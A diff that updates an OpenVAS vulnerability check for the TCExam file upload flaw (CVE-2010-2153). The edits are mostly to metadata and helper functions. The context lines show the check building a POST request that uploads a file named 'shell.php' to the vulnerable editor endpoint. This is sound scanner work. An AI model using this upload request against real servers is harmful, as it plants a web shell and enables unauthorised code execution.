@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_tcexam_file_upload_vuln.nasl 5373 2017-02-20 16:27:48Z teissa $
+# $Id: gb_tcexam_file_upload_vuln.nasl 5843 2017-04-03 13:42:51Z cfi $
 #
 # TCExam 'tce_functions_tcecode_editor.php' File Upload Vulnerability
 #
@@ -43,8 +43,8 @@ vulnerability.";
 if(description)
 {
   script_id(800793);
-  script_version("$Revision: 5373 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-02-20 17:27:48 +0100 (Mon, 20 Feb 2017) $");
+  script_version("$Revision: 5843 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-04-03 15:42:51 +0200 (Mon, 03 Apr 2017) $");
   script_tag(name:"creation_date", value:"2010-06-11 14:27:58 +0200 (Fri, 11 Jun 2010)");
   script_cve_id("CVE-2010-2153");
   script_bugtraq_id(40511);
@@ -61,6 +61,8 @@ if(description)
   script_family("Web application abuses");
   script_dependencies("gb_tcexam_detect.nasl");
   script_require_ports("Services/www", 80);
+  script_mandatory_keys("TCExam/installed");
+
   script_tag(name : "impact" , value : tag_impact);
   script_tag(name : "affected" , value : tag_affected);
   script_tag(name : "insight" , value : tag_insight);
@@ -69,17 +71,11 @@ if(description)
   exit(0);
 }
 
-
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Get HTTP Port
 tcPort = get_http_port(default:80);
-if(!tcPort){
-  exit(0);
-}
 
-## Get the version from KB
 tcVer = get_kb_item("www/" + tcPort + "/TCExam");
 if(!tcVer){
   exit(0);
@@ -88,8 +84,7 @@ if(!tcVer){
 tcVer = eregmatch(pattern:"^(.+) under (/.*)$", string:tcVer);
 if(tcVer[2] != NULL)
 {
-  host = get_host_name();
-  tc_exam = "http://" + host + tcVer[2];
+  host = http_host_name(port:tcPort);
 
   ## Create a file called 'shell.php' and write the data into file
   content = string("------x\r\n",
@@ -108,7 +103,7 @@ if(tcVer[2] != NULL)
  header = string("POST " + tcVer[2] + "/admin/code/tce_functions_tcecode_editor.php HTTP/1.1\r\n",
                   "Host: " + host + "\r\n",
                   "Proxy-Connection: keep-alive\r\n",
-                  "User-Agent: x\r\n",
+                  "User-Agent: " + OPENVAS_HTTP_USER_AGENT + "\r\n",
                   "Content-Length: " + strlen(content) + "\r\n",
                   "Cache-Control: max-age=0\r\n",
                   "Origin: null\r\n",
